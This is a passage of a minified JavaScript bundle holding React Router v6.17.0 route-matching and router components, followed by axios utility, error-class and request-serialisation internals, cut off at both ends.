      let i = { relativePath: void 0 === a ? e.path || "" : a, caseSensitive: !0 === e.caseSensitive, childrenIndex: o, route: e };
      i.relativePath.startsWith("/") &&
          (dd(i.relativePath.startsWith(r), 'Absolute route path "' + i.relativePath + '" nested under path "' + r + '" is not valid. An absolute child route path must start with the combined path of all its parent routes.'),
          (i.relativePath = i.relativePath.slice(r.length)));
      let s = Fd([r, i.relativePath]),
          l = n.concat(i);
      e.children && e.children.length > 0 && (dd(!0 !== e.index, 'Index routes must not have child routes. Please remove all child routes from route path "' + s + '".'), xd(e.children, t, l, s)),
          (null != e.path || e.index) && t.push({ path: s, score: Rd(s, e.index), routesMeta: l });
  };
  return (
      e.forEach((e, t) => {
          var n;
          if ("" !== e.path && null != (n = e.path) && n.includes("?")) for (let r of wd(e.path)) o(e, t, r);
          else o(e, t);
      }),
      t
  );
}
function wd(e) {
  let t = e.split("/");
  if (0 === t.length) return [];
  let [n, ...r] = t,
      o = n.endsWith("?"),
      a = n.replace(/\?$/, "");
  if (0 === r.length) return o ? [a, ""] : [a];
  let i = wd(r.join("/")),
      s = [];
  return s.push(...i.map((e) => ("" === e ? a : [a, e].join("/")))), o && s.push(...i), s.map((t) => (e.startsWith("/") && "" === t ? "/" : t));
}
((yd = vd || (vd = {})).data = "data"), (yd.deferred = "deferred"), (yd.redirect = "redirect"), (yd.error = "error");
const Sd = /^:\w+$/,
  kd = 3,
  Ed = 2,
  Cd = 1,
  _d = 10,
  Pd = -2,
  Td = (e) => "*" === e;
function Rd(e, t) {
  let n = e.split("/"),
      r = n.length;
  return n.some(Td) && (r += Pd), t && (r += Ed), n.filter((e) => !Td(e)).reduce((e, t) => e + (Sd.test(t) ? kd : "" === t ? Cd : _d), r);
}
function zd(e, t) {
  let { routesMeta: n } = e,
      r = {},
      o = "/",
      a = [];
  for (let i = 0; i < n.length; ++i) {
      let e = n[i],
          s = i === n.length - 1,
          l = "/" === o ? t : t.slice(o.length) || "/",
          c = Ad({ path: e.relativePath, caseSensitive: e.caseSensitive, end: s }, l);
      if (!c) return null;
      Object.assign(r, c.params);
      let u = e.route;
      a.push({ params: r, pathname: Fd([o, c.pathname]), pathnameBase: Nd(Fd([o, c.pathnameBase])), route: u }), "/" !== c.pathnameBase && (o = Fd([o, c.pathnameBase]));
  }
  return a;
}
function Ad(e, t) {
  "string" == typeof e && (e = { path: e, caseSensitive: !1, end: !0 });
  let [n, r] = (function (e, t, n) {
          void 0 === t && (t = !1);
          void 0 === n && (n = !0);
          fd(
              "*" === e || !e.endsWith("*") || e.endsWith("/*"),
              'Route path "' +
                  e +
                  '" will be treated as if it were "' +
                  e.replace(/\*$/, "/*") +
                  '" because the `*` character must always follow a `/` in the pattern. To get rid of this warning, please change the route path to "' +
                  e.replace(/\*$/, "/*") +
                  '".'
          );
          let r = [],
              o =
                  "^" +
                  e
                      .replace(/\/*\*?$/, "")
                      .replace(/^\/*/, "/")
                      .replace(/[\\.*+^$?{}|()[\]]/g, "\\$&")
                      .replace(/\/:(\w+)/g, (e, t) => (r.push(t), "/([^\\/]+)"));
          e.endsWith("*") ? (r.push("*"), (o += "*" === e || "/*" === e ? "(.*)$" : "(?:\\/(.+)|\\/*)$")) : n ? (o += "\\/*$") : "" !== e && "/" !== e && (o += "(?:(?=\\/|$))");
          let a = new RegExp(o, t ? void 0 : "i");
          return [a, r];
      })(e.path, e.caseSensitive, e.end),
      o = t.match(n);
  if (!o) return null;
  let a = o[0],
      i = a.replace(/(.)\/+$/, "$1"),
      s = o.slice(1);
  return {
      params: r.reduce((e, t, n) => {
          if ("*" === t) {
              let e = s[n] || "";
              i = a.slice(0, a.length - e.length).replace(/(.)\/+$/, "$1");
          }
          return (
              (e[t] = (function (e, t) {
                  try {
                      return decodeURIComponent(e);
                  } catch (n) {
                      return fd(!1, 'The value for the URL param "' + t + '" will not be decoded because the string "' + e + '" is a malformed URL segment. This is probably due to a bad percent encoding (' + n + ")."), e;
                  }
              })(s[n] || "", t)),
              e
          );
      }, {}),
      pathname: a,
      pathnameBase: i,
      pattern: e,
  };
}
function jd(e) {
  try {
      return decodeURI(e);
  } catch (t) {
      return fd(!1, 'The URL path "' + e + '" could not be decoded because it is is a malformed URL segment. This is probably due to a bad percent encoding (' + t + ")."), e;
  }
}
function Od(e, t) {
  if ("/" === t) return e;
  if (!e.toLowerCase().startsWith(t.toLowerCase())) return null;
  let n = t.endsWith("/") ? t.length - 1 : t.length,
      r = e.charAt(n);
  return r && "/" !== r ? null : e.slice(n) || "/";
}
const Fd = (e) => e.join("/").replace(/\/\/+/g, "/"),
  Nd = (e) => e.replace(/\/+$/, "").replace(/^\/*/, "/");
const Md = ["post", "put", "patch", "delete"];
new Set(Md);
const Ld = ["get", ...Md];
/**
* React Router v6.17.0
*
* Copyright (c) Remix Software Inc.
*
* This source code is licensed under the MIT license found in the
* LICENSE.md file in the root directory of this source tree.
*
* @license MIT
*/
function Bd() {
  return (
      (Bd = Object.assign
          ? Object.assign.bind()
          : function (e) {
                for (var t = 1; t < arguments.length; t++) {
                    var n = arguments[t];
                    for (var r in n) Object.prototype.hasOwnProperty.call(n, r) && (e[r] = n[r]);
                }
                return e;
            }),
      Bd.apply(this, arguments)
  );
}
new Set(Ld);
const Id = D.createContext(null),
  Dd = D.createContext(null),
  $d = D.createContext(null),
  Vd = D.createContext(null),
  Ud = D.createContext({ outlet: null, matches: [], isDataRoute: !1 }),
  Wd = D.createContext(null);
function Hd() {
  return null != D.useContext(Vd);
}
function qd(e, t) {
  return (function (e, t, n) {
      Hd() || dd(!1);
      let { navigator: r } = D.useContext($d),
          { matches: o } = D.useContext(Ud),
          a = o[o.length - 1],
          i = a ? a.params : {};
      !a || a.pathname;
      let s = a ? a.pathnameBase : "/";
      a && a.route;
      let l,
          c = (Hd() || dd(!1), D.useContext(Vd).location);
      if (t) {
          var u;
          let e = "string" == typeof t ? gd(t) : t;
          "/" === s || (null == (u = e.pathname) ? void 0 : u.startsWith(s)) || dd(!1), (l = e);
      } else l = c;
      let d = l.pathname || "/",
          f = "/" === s ? d : d.slice(s.length) || "/",
          p = bd(e, { pathname: f }),
          h = (function (e, t, n) {
              var r, o;
              void 0 === t && (t = []);
              void 0 === n && (n = null);
              if (null == e) {
                  if (null == (o = n) || !o.errors) return null;
                  e = n.matches;
              }
              let a = e,
                  i = null == (r = n) ? void 0 : r.errors;
              if (null != i) {
                  let e = a.findIndex((e) => e.route.id && (null == i ? void 0 : i[e.route.id]));
                  e >= 0 || dd(!1), (a = a.slice(0, Math.min(a.length, e + 1)));
              }
              return a.reduceRight((e, r, o) => {
                  let s = r.route.id ? (null == i ? void 0 : i[r.route.id]) : null,
                      l = null;
                  n && (l = r.route.errorElement || Xd);
                  let c = t.concat(a.slice(0, o + 1)),
                      u = () => {
                          let t;
                          return (
                              (t = s ? l : r.route.Component ? D.createElement(r.route.Component, null) : r.route.element ? r.route.element : e),
                              D.createElement(Qd, { match: r, routeContext: { outlet: e, matches: c, isDataRoute: null != n }, children: t })
                          );
                      };
                  return n && (r.route.ErrorBoundary || r.route.errorElement || 0 === o)
                      ? D.createElement(Gd, { location: n.location, revalidation: n.revalidation, component: l, error: s, children: u(), routeContext: { outlet: null, matches: c, isDataRoute: !0 } })
                      : u();
              }, null);
          })(
              p &&
                  p.map((e) =>
                      Object.assign({}, e, {
                          params: Object.assign({}, i, e.params),
                          pathname: Fd([s, r.encodeLocation ? r.encodeLocation(e.pathname).pathname : e.pathname]),
                          pathnameBase: "/" === e.pathnameBase ? s : Fd([s, r.encodeLocation ? r.encodeLocation(e.pathnameBase).pathname : e.pathnameBase]),
                      })
                  ),
              o,
              n
          );
      if (t && h) return D.createElement(Vd.Provider, { value: { location: Bd({ pathname: "/", search: "", hash: "", state: null, key: "default" }, l), navigationType: od.Pop } }, h);
      return h;
  })(e, t);
}
function Yd() {
  let e = (function () {
          var e;
          let t = D.useContext(Wd),
              n = (function (e) {
                  let t = D.useContext(Dd);
                  return t || dd(!1), t;
              })(Kd.UseRouteError),
              r = (function (e) {
                  let t = (function (e) {
                          let t = D.useContext(Ud);
                          return t || dd(!1), t;
                      })(),
                      n = t.matches[t.matches.length - 1];
                  return n.route.id || dd(!1), n.route.id;
              })(Kd.UseRouteError);
          if (t) return t;
          return null == (e = n.errors) ? void 0 : e[r];
      })(),
      t = (function (e) {
          return null != e && "number" == typeof e.status && "string" == typeof e.statusText && "boolean" == typeof e.internal && "data" in e;
      })(e)
          ? e.status + " " + e.statusText
          : e instanceof Error
          ? e.message
          : JSON.stringify(e),
      n = e instanceof Error ? e.stack : null,
      r = { padding: "0.5rem", backgroundColor: "rgba(200,200,200, 0.5)" };
  return D.createElement(D.Fragment, null, D.createElement("h2", null, "Unexpected Application Error!"), D.createElement("h3", { style: { fontStyle: "italic" } }, t), n ? D.createElement("pre", { style: r }, n) : null, null);
}
const Xd = D.createElement(Yd, null);
class Gd extends D.Component {
  constructor(e) {
      super(e), (this.state = { location: e.location, revalidation: e.revalidation, error: e.error });
  }
  static getDerivedStateFromError(e) {
      return { error: e };
  }
  static getDerivedStateFromProps(e, t) {
      return t.location !== e.location || ("idle" !== t.revalidation && "idle" === e.revalidation)
          ? { error: e.error, location: e.location, revalidation: e.revalidation }
          : { error: e.error || t.error, location: t.location, revalidation: e.revalidation || t.revalidation };
  }
  componentDidCatch(e, t) {}
  render() {
      return this.state.error ? D.createElement(Ud.Provider, { value: this.props.routeContext }, D.createElement(Wd.Provider, { value: this.state.error, children: this.props.component })) : this.props.children;
  }
}
function Qd(e) {
  let { routeContext: t, match: n, children: r } = e,
      o = D.useContext(Id);
  return o && o.static && o.staticContext && (n.route.errorElement || n.route.ErrorBoundary) && (o.staticContext._deepestRenderedBoundaryId = n.route.id), D.createElement(Ud.Provider, { value: t }, r);
}
var Kd = (function (e) {
  return (
      (e.UseBlocker = "useBlocker"),
      (e.UseLoaderData = "useLoaderData"),
      (e.UseActionData = "useActionData"),
      (e.UseRouteError = "useRouteError"),
      (e.UseNavigation = "useNavigation"),
      (e.UseRouteLoaderData = "useRouteLoaderData"),
      (e.UseMatches = "useMatches"),
      (e.UseRevalidator = "useRevalidator"),
      (e.UseNavigateStable = "useNavigate"),
      (e.UseRouteId = "useRouteId"),
      e
  );
})(Kd || {});
function Zd(e) {
  dd(!1);
}
function Jd(e) {
  let { basename: t = "/", children: n = null, location: r, navigationType: o = od.Pop, navigator: a, static: i = !1 } = e;
  Hd() && dd(!1);
  let s = t.replace(/^\/*/, "/"),
      l = D.useMemo(() => ({ basename: s, navigator: a, static: i }), [s, a, i]);
  "string" == typeof r && (r = gd(r));
  let { pathname: c = "/", search: u = "", hash: d = "", state: f = null, key: p = "default" } = r,
      h = D.useMemo(() => {
          let e = Od(c, s);
          return null == e ? null : { location: { pathname: e, search: u, hash: d, state: f, key: p }, navigationType: o };
      }, [s, c, u, d, f, p, o]);
  return null == h ? null : D.createElement($d.Provider, { value: l }, D.createElement(Vd.Provider, { children: n, value: h }));
}
function ef(e) {
  let { children: t, location: n } = e;
  return qd(tf(t), n);
}
function tf(e, t) {
  void 0 === t && (t = []);
  let n = [];
  return (
      D.Children.forEach(e, (e, r) => {
          if (!D.isValidElement(e)) return;
          let o = [...t, r];
          if (e.type === D.Fragment) return void n.push.apply(n, tf(e.props.children, o));
          e.type !== Zd && dd(!1), e.props.index && e.props.children && dd(!1);
          let a = {
              id: e.props.id || o.join("-"),
              caseSensitive: e.props.caseSensitive,
              element: e.props.element,
              Component: e.props.Component,
              index: e.props.index,
              path: e.props.path,
              loader: e.props.loader,
              action: e.props.action,
              errorElement: e.props.errorElement,
              ErrorBoundary: e.props.ErrorBoundary,
              hasErrorBoundary: null != e.props.ErrorBoundary || null != e.props.errorElement,
              shouldRevalidate: e.props.shouldRevalidate,
              handle: e.props.handle,
              lazy: e.props.lazy,
          };
          e.props.children && (a.children = tf(e.props.children, o)), n.push(a);
      }),
      n
  );
}
/**
* React Router DOM v6.17.0
*
* Copyright (c) Remix Software Inc.
*
* This source code is licensed under the MIT license found in the
* LICENSE.md file in the root directory of this source tree.
*
* @license MIT
*/ new Promise(() => {});
const nf = V.startTransition;
function rf(e) {
  let { basename: t, children: n, future: r, window: o } = e,
      a = D.useRef();
  null == a.current && (a.current = ud({ window: o, v5Compat: !0 }));
  let i = a.current,
      [s, l] = D.useState({ action: i.action, location: i.location }),
      { v7_startTransition: c } = r || {},
      u = D.useCallback(
          (e) => {
              c && nf ? nf(() => l(e)) : l(e);
          },
          [l, c]
      );
  return D.useLayoutEffect(() => i.listen(u), [i, u]), D.createElement(Jd, { basename: t, children: n, location: s.location, navigationType: s.action, navigator: i });
}
var of, af, sf, lf;
function cf(e, t) {
  return function () {
      return e.apply(t, arguments);
  };
}
((af = of || (of = {})).UseScrollRestoration = "useScrollRestoration"),
  (af.UseSubmit = "useSubmit"),
  (af.UseSubmitFetcher = "useSubmitFetcher"),
  (af.UseFetcher = "useFetcher"),
  (af.useViewTransitionState = "useViewTransitionState"),
  ((lf = sf || (sf = {})).UseFetchers = "useFetchers"),
  (lf.UseScrollRestoration = "useScrollRestoration");
const { toString: uf } = Object.prototype,
  { getPrototypeOf: df } = Object,
  ff =
      ((pf = Object.create(null)),
      (e) => {
          const t = uf.call(e);
          return pf[t] || (pf[t] = t.slice(8, -1).toLowerCase());
      });
var pf;
const hf = (e) => ((e = e.toLowerCase()), (t) => ff(t) === e),
  mf = (e) => (t) => typeof t === e,
  { isArray: gf } = Array,
  vf = mf("undefined");
const yf = hf("ArrayBuffer");
const bf = mf("string"),
  xf = mf("function"),
  wf = mf("number"),
  Sf = (e) => null !== e && "object" == typeof e,
  kf = (e) => {
      if ("object" !== ff(e)) return !1;
      const t = df(e);
      return !((null !== t && t !== Object.prototype && null !== Object.getPrototypeOf(t)) || Symbol.toStringTag in e || Symbol.iterator in e);
  },
  Ef = hf("Date"),
  Cf = hf("File"),
  _f = hf("Blob"),
  Pf = hf("FileList"),
  Tf = hf("URLSearchParams");
function Rf(e, t, { allOwnKeys: n = !1 } = {}) {
  if (null == e) return;
  let r, o;
  if (("object" != typeof e && (e = [e]), gf(e))) for (r = 0, o = e.length; r < o; r++) t.call(null, e[r], r, e);
  else {
      const o = n ? Object.getOwnPropertyNames(e) : Object.keys(e),
          a = o.length;
      let i;
      for (r = 0; r < a; r++) (i = o[r]), t.call(null, e[i], i, e);
  }
}
function zf(e, t) {
  t = t.toLowerCase();
  const n = Object.keys(e);
  let r,
      o = n.length;
  for (; o-- > 0; ) if (((r = n[o]), t === r.toLowerCase())) return r;
  return null;
}
const Af = "undefined" != typeof globalThis ? globalThis : "undefined" != typeof self ? self : "undefined" != typeof window ? window : global,
  jf = (e) => !vf(e) && e !== Af;
const Of = ((Ff = "undefined" != typeof Uint8Array && df(Uint8Array)), (e) => Ff && e instanceof Ff);
var Ff;
const Nf = hf("HTMLFormElement"),
  Mf = (({ hasOwnProperty: e }) => (t, n) => e.call(t, n))(Object.prototype),
  Lf = hf("RegExp"),
  Bf = (e, t) => {
      const n = Object.getOwnPropertyDescriptors(e),
          r = {};
      Rf(n, (n, o) => {
          !1 !== t(n, o, e) && (r[o] = n);
      }),
          Object.defineProperties(e, r);
  },
  If = "abcdefghijklmnopqrstuvwxyz",
  Df = "0123456789",
  $f = { DIGIT: Df, ALPHA: If, ALPHA_DIGIT: If + If.toUpperCase() + Df };
const Vf = hf("AsyncFunction"),
  Uf = {
      isArray: gf,
      isArrayBuffer: yf,
      isBuffer: function (e) {
          return null !== e && !vf(e) && null !== e.constructor && !vf(e.constructor) && xf(e.constructor.isBuffer) && e.constructor.isBuffer(e);
      },
      isFormData: (e) => {
          let t;
          return e && (("function" == typeof FormData && e instanceof FormData) || (xf(e.append) && ("formdata" === (t = ff(e)) || ("object" === t && xf(e.toString) && "[object FormData]" === e.toString()))));
      },
      isArrayBufferView: function (e) {
          let t;
          return (t = "undefined" != typeof ArrayBuffer && ArrayBuffer.isView ? ArrayBuffer.isView(e) : e && e.buffer && yf(e.buffer)), t;
      },
      isString: bf,
      isNumber: wf,
      isBoolean: (e) => !0 === e || !1 === e,
      isObject: Sf,
      isPlainObject: kf,
      isUndefined: vf,
      isDate: Ef,
      isFile: Cf,
      isBlob: _f,
      isRegExp: Lf,
      isFunction: xf,
      isStream: (e) => Sf(e) && xf(e.pipe),
      isURLSearchParams: Tf,
      isTypedArray: Of,
      isFileList: Pf,
      forEach: Rf,
      merge: function e() {
          const { caseless: t } = (jf(this) && this) || {},
              n = {},
              r = (r, o) => {
                  const a = (t && zf(n, o)) || o;
                  kf(n[a]) && kf(r) ? (n[a] = e(n[a], r)) : kf(r) ? (n[a] = e({}, r)) : gf(r) ? (n[a] = r.slice()) : (n[a] = r);
              };
          for (let o = 0, a = arguments.length; o < a; o++) arguments[o] && Rf(arguments[o], r);
          return n;
      },
      extend: (e, t, n, { allOwnKeys: r } = {}) => (
          Rf(
              t,
              (t, r) => {
                  n && xf(t) ? (e[r] = cf(t, n)) : (e[r] = t);
              },
              { allOwnKeys: r }
          ),
          e
      ),
      trim: (e) => (e.trim ? e.trim() : e.replace(/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g, "")),
      stripBOM: (e) => (65279 === e.charCodeAt(0) && (e = e.slice(1)), e),
      inherits: (e, t, n, r) => {
          (e.prototype = Object.create(t.prototype, r)), (e.prototype.constructor = e), Object.defineProperty(e, "super", { value: t.prototype }), n && Object.assign(e.prototype, n);
      },
      toFlatObject: (e, t, n, r) => {
          let o, a, i;
          const s = {};
          if (((t = t || {}), null == e)) return t;
          do {
              for (o = Object.getOwnPropertyNames(e), a = o.length; a-- > 0; ) (i = o[a]), (r && !r(i, e, t)) || s[i] || ((t[i] = e[i]), (s[i] = !0));
              e = !1 !== n && df(e);
          } while (e && (!n || n(e, t)) && e !== Object.prototype);
          return t;
      },
      kindOf: ff,
      kindOfTest: hf,
      endsWith: (e, t, n) => {
          (e = String(e)), (void 0 === n || n > e.length) && (n = e.length), (n -= t.length);
          const r = e.indexOf(t, n);
          return -1 !== r && r === n;
      },
      toArray: (e) => {
          if (!e) return null;
          if (gf(e)) return e;
          let t = e.length;
          if (!wf(t)) return null;
          const n = new Array(t);
          for (; t-- > 0; ) n[t] = e[t];
          return n;
      },
      forEachEntry: (e, t) => {
          const n = (e && e[Symbol.iterator]).call(e);
          let r;
          for (; (r = n.next()) && !r.done; ) {
              const n = r.value;
              t.call(e, n[0], n[1]);
          }
      },
      matchAll: (e, t) => {
          let n;
          const r = [];
          for (; null !== (n = e.exec(t)); ) r.push(n);
          return r;
      },
      isHTMLForm: Nf,
      hasOwnProperty: Mf,
      hasOwnProp: Mf,
      reduceDescriptors: Bf,
      freezeMethods: (e) => {
          Bf(e, (t, n) => {
              if (xf(e) && -1 !== ["arguments", "caller", "callee"].indexOf(n)) return !1;
              const r = e[n];
              xf(r) &&
                  ((t.enumerable = !1),
                  "writable" in t
                      ? (t.writable = !1)
                      : t.set ||
                        (t.set = () => {
                            throw Error("Can not rewrite read-only method '" + n + "'");
                        }));
          });
      },
      toObjectSet: (e, t) => {
          const n = {},
              r = (e) => {
                  e.forEach((e) => {
                      n[e] = !0;
                  });
              };
          return gf(e) ? r(e) : r(String(e).split(t)), n;
      },
      toCamelCase: (e) =>
          e.toLowerCase().replace(/[-_\s]([a-z\d])(\w*)/g, function (e, t, n) {
              return t.toUpperCase() + n;
          }),
      noop: () => {},
      toFiniteNumber: (e, t) => ((e = +e), Number.isFinite(e) ? e : t),
      findKey: zf,
      global: Af,
      isContextDefined: jf,
      ALPHABET: $f,
      generateString: (e = 16, t = $f.ALPHA_DIGIT) => {
          let n = "";
          const { length: r } = t;
          for (; e--; ) n += t[(Math.random() * r) | 0];
          return n;
      },
      isSpecCompliantForm: function (e) {
          return !!(e && xf(e.append) && "FormData" === e[Symbol.toStringTag] && e[Symbol.iterator]);
      },
      toJSONObject: (e) => {
          const t = new Array(10),
              n = (e, r) => {
                  if (Sf(e)) {
                      if (t.indexOf(e) >= 0) return;
                      if (!("toJSON" in e)) {
                          t[r] = e;
                          const o = gf(e) ? [] : {};
                          return (
                              Rf(e, (e, t) => {
                                  const a = n(e, r + 1);
                                  !vf(a) && (o[t] = a);
                              }),
                              (t[r] = void 0),
                              o
                          );
                      }
                  }
                  return e;
              };
          return n(e, 0);
      },
      isAsyncFn: Vf,
      isThenable: (e) => e && (Sf(e) || xf(e)) && xf(e.then) && xf(e.catch),
  };
function Wf(e, t, n, r, o) {
  Error.call(this),
      Error.captureStackTrace ? Error.captureStackTrace(this, this.constructor) : (this.stack = new Error().stack),
      (this.message = e),
      (this.name = "AxiosError"),
      t && (this.code = t),
      n && (this.config = n),
      r && (this.request = r),
      o && (this.response = o);
}
Uf.inherits(Wf, Error, {
  toJSON: function () {
      return {
          message: this.message,
          name: this.name,
          description: this.description,
          number: this.number,
          fileName: this.fileName,
          lineNumber: this.lineNumber,
          columnNumber: this.columnNumber,
          stack: this.stack,
          config: Uf.toJSONObject(this.config),
          code: this.code,
          status: this.response && this.response.status ? this.response.status : null,
      };
  },
});
const Hf = Wf.prototype,
  qf = {};
["ERR_BAD_OPTION_VALUE", "ERR_BAD_OPTION", "ECONNABORTED", "ETIMEDOUT", "ERR_NETWORK", "ERR_FR_TOO_MANY_REDIRECTS", "ERR_DEPRECATED", "ERR_BAD_RESPONSE", "ERR_BAD_REQUEST", "ERR_CANCELED", "ERR_NOT_SUPPORT", "ERR_INVALID_URL"].forEach(
  (e) => {
      qf[e] = { value: e };
  }
),
  Object.defineProperties(Wf, qf),
  Object.defineProperty(Hf, "isAxiosError", { value: !0 }),
  (Wf.from = (e, t, n, r, o, a) => {
      const i = Object.create(Hf);
      return (
          Uf.toFlatObject(
              e,
              i,
              function (e) {
                  return e !== Error.prototype;
              },
              (e) => "isAxiosError" !== e
          ),
          Wf.call(i, e.message, t, n, r, o),
          (i.cause = e),
          (i.name = e.name),
          a && Object.assign(i, a),
          i
      );
  });
function Yf(e) {
  return Uf.isPlainObject(e) || Uf.isArray(e);
}
function Xf(e) {
  return Uf.endsWith(e, "[]") ? e.slice(0, -2) : e;
}
function Gf(e, t, n) {
  return e
      ? e
            .concat(t)
            .map(function (e, t) {
                return (e = Xf(e)), !n && t ? "[" + e + "]" : e;
            })
            .join(n ? "." : "")
      : t;
}
const Qf = Uf.toFlatObject(Uf, {}, null, function (e) {
  return /^is[A-Z]/.test(e);
});
function Kf(e, t, n) {
  if (!Uf.isObject(e)) throw new TypeError("target must be an object");
  t = t || new FormData();
  const r = (n = Uf.toFlatObject(n, { metaTokens: !0, dots: !1, indexes: !1 }, !1, function (e, t) {
          return !Uf.isUndefined(t[e]);
      })).metaTokens,
      o = n.visitor || c,
      a = n.dots,
      i = n.indexes,
      s = (n.Blob || ("undefined" != typeof Blob && Blob)) && Uf.isSpecCompliantForm(t);
  if (!Uf.isFunction(o)) throw new TypeError("visitor must be a function");
  function l(e) {
      if (null === e) return "";
      if (Uf.isDate(e)) return e.toISOString();
      if (!s && Uf.isBlob(e)) throw new Wf("Blob is not supported. Use a Buffer instead.");
      return Uf.isArrayBuffer(e) || Uf.isTypedArray(e) ? (s && "function" == typeof Blob ? new Blob([e]) : Buffer.from(e)) : e;
  }
  function c(e, n, o) {
      let s = e;
      if (e && !o && "object" == typeof e)
          if (Uf.endsWith(n, "{}")) (n = r ? n : n.slice(0, -2)), (e = JSON.stringify(e));
          else if (
              (Uf.isArray(e) &&
                  (function (e) {
                      return Uf.isArray(e) && !e.some(Yf);
                  })(e)) ||
              ((Uf.isFileList(e) || Uf.endsWith(n, "[]")) && (s = Uf.toArray(e)))
          )
              return (
                  (n = Xf(n)),
                  s.forEach(function (e, r) {
                      !Uf.isUndefined(e) && null !== e && t.append(!0 === i ? Gf([n], r, a) : null === i ? n : n + "[]", l(e));
                  }),
                  !1
              );
      return !!Yf(e) || (t.append(Gf(o, n, a), l(e)), !1);
  }
  const u = [],
      d = Object.assign(Qf, { defaultVisitor: c, convertValue: l, isVisitable: Yf });
  if (!Uf.isObject(e)) throw new TypeError("data must be an object");
  return (
      (function e(n, r) {
          if (!Uf.isUndefined(n)) {
              if (-1 !== u.indexOf(n)) throw Error("Circular reference detected in " + r.join("."));
              u.push(n),
                  Uf.forEach(n, function (n, a) {
                      !0 === (!(Uf.isUndefined(n) || null === n) && o.call(t, n, Uf.isString(a) ? a.trim() : a, r, d)) && e(n, r ? r.concat(a) : [a]);
                  }),
                  u.pop();
          }
      })(e),
      t
  );
}
function Zf(e) {
  const t = { "!": "%21", "'": "%27", "(": "%28", ")": "%29", "~": "%7E", "%20": "+", "%00": "\0" };
  return encodeURIComponent(e).replace(/[!'()~]|%20|%00/g, function (e) {
      return t[e];
  });
}
function Jf(e, t) {
  (this._pairs = []), e && Kf(e, this, t);
}
const ep = Jf.prototype;
function tp(e) {
  return encodeURIComponent(e).replace(/%3A/gi, ":").replace(/%24/g, "$").replace(/%2C/gi, ",").replace(/%20/g, "+").replace(/%5B/gi, "[").replace(/%5D/gi, "]");
}
function np(e, t, n) {
  if (!t) return e;
  const r = (n && n.encode) || tp,
      o = n && n.serialize;
  let a;
  if (((a = o ? o(t, n) : Uf.isURLSearchParams(t) ? t.toString() : new Jf(t, n).toString(r)), a)) {
      const t = e.indexOf("#");
      -1 !== t && (e = e.slice(0, t)), (e += (-1 === e.indexOf("?") ? "?" : "&") + a);
  }
  return e;
}
(ep.append = function (e, t) {
  this._pairs.push([e, t]);
}),
  (ep.toString = function (e) {
      const t = e
          ? function (t) {
                return e.call(this, t, Zf);
            }
          : Zf;
      return this._pairs
          .map(function (e) {
              return t(e[0]) + "=" + t(e[1]);
          }, "")
          .join("&");
  });
const rp = class {
      constructor() {
          this.handlers = [];
      }
      use(e, t, n) {
          return this.handlers.push({ fulfilled: e, rejected: t, synchronous: !!n && n.synchronous, runWhen: n ? n.runWhen : null }), this.handlers.length - 1;
      }
      eject(e) {
          this.handlers[e] && (this.handlers[e] = null);
      }
      clear() {
          this.handlers && (this.handlers = []);
      }
      forEach(e) {
          Uf.forEach(this.handlers, function (t) {
              null !== t && e(t);
          });
      }
  },
  op = { silentJSONParsing: !0, forcedJSONParsing: !0, clarifyTimeoutError: !1 },
  ap = {
      isBrowser: !0,
      classes: { URLSearchParams: "undefined" != typeof URLSearchParams ? URLSearchParams : Jf, FormData: "undefined" != typeof FormData ? FormData : null, Blob: "undefined" != typeof Blob ? Blob : null },
      isStandardBrowserEnv: (() => {
          let e;
          return ("undefined" == typeof navigator || ("ReactNative" !== (e = navigator.product) && "NativeScript" !== e && "NS" !== e)) && "undefined" != typeof window && "undefined" != typeof document;
      })(),
      isStandardBrowserWebWorkerEnv: "undefined" != typeof WorkerGlobalScope && self instanceof WorkerGlobalScope && "function" == typeof self.importScripts,
      protocols: ["http", "https", "file", "blob", "url", "data"],
  };
function ip(e) {
  function t(e, n, r, o) {
      let a = e[o++];
      const i = Number.isFinite(+a),
          s = o >= e.length;
      if (((a = !a && Uf.isArray(r) ? r.length : a), s)) return Uf.hasOwnProp(r, a) ? (r[a] = [r[a], n]) : (r[a] = n), !i;
      (r[a] && Uf.isObject(r[a])) || (r[a] = []);
      return (
          t(e, n, r[a], o) &&
              Uf.isArray(r[a]) &&
              (r[a] = (function (e) {
                  const t = {},
                      n = Object.keys(e);
                  let r;
                  const o = n.length;
                  let a;
                  for (r = 0; r < o; r++) (a = n[r]), (t[a] = e[a]);
                  return t;
              })(r[a])),
          !i
      );
  }
  if (Uf.isFormData(e) && Uf.isFunction(e.entries)) {
      const n = {};
      return (
          Uf.forEachEntry(e, (e, r) => {
              t(
                  (function (e) {
                      return Uf.matchAll(/\w+|\[(\w*)]/g, e).map((e) => ("[]" === e[0] ? "" : e[1] || e[0]));
                  })(e),
                  r,
                  n,
                  0
              );
          }),
          n
      );
  }
  return null;
}
const sp = { "Content-Type": void 0 };
const lp = {
  transitional: op,
  adapter: ["xhr", "http"],
  transformRequest: [
      function (e, t) {
          const n = t.getContentType() || "",
              r = n.indexOf("application/json") > -1,
              o = Uf.isObject(e);
          o && Uf.isHTMLForm(e) && (e = new FormData(e));
          if (Uf.isFormData(e)) return r && r ? JSON.stringify(ip(e)) : e;
          if (Uf.isArrayBuffer(e) || Uf.isBuffer(e) || Uf.isStream(e) || Uf.isFile(e) || Uf.isBlob(e)) return e;
          if (Uf.isArrayBufferView(e)) return e.buffer;
          if (Uf.isURLSearchParams(e)) return t.setContentType("application/x-www-form-urlencoded;charset=utf-8", !1), e.toString();
          let a;
          if (o) {
              if (n.indexOf("application/x-www-form-urlencoded") > -1)
                  return (function (e, t) {
                      return Kf(
                          e,
                          new ap.classes.URLSearchParams(),
                          Object.assign(
                              {
                                  visitor: function (e, t, n, r) {
                                      return ap.isNode && Uf.isBuffer(e) ? (this.append(t, e.toString("base64")), !1) : r.defaultVisitor.apply(this, arguments);
                                  },
                              },
                              t
                          )
                      );
                  })(e, this.formSerializer).toString();
              if ((a = Uf.isFileList(e)) || n.indexOf("multipart/form-data") > -1) {
                  const t = this.env && this.env.FormData;
                  return Kf(a ? { "files[]": e } : e, t && new t(), this.formSerializer);
              }
          }
          return o || r
              ? (t.setContentType("application/json", !1),
                (function (e, t, n) {
                    if (Uf.isString(e))
                        try {
                            return (t || JSON.parse)(e), Uf.trim(e);
                        } catch (gF) {
                            if ("SyntaxError" !== gF.name) throw gF;
                        }
                    return (n || JSON.stringify)(e);
                })(e))
              : e;
      },
  ],
  transformResponse: [
      function (e) {
          const t = this.transitional || lp.transitional,
              n = t && t.forcedJSONParsing,
              r = "json" === this.responseType;
          if (e && Uf.isString(e) && ((n && !this.responseType) || r)) {
              const n = !(t && t.silentJSONParsing) && r;
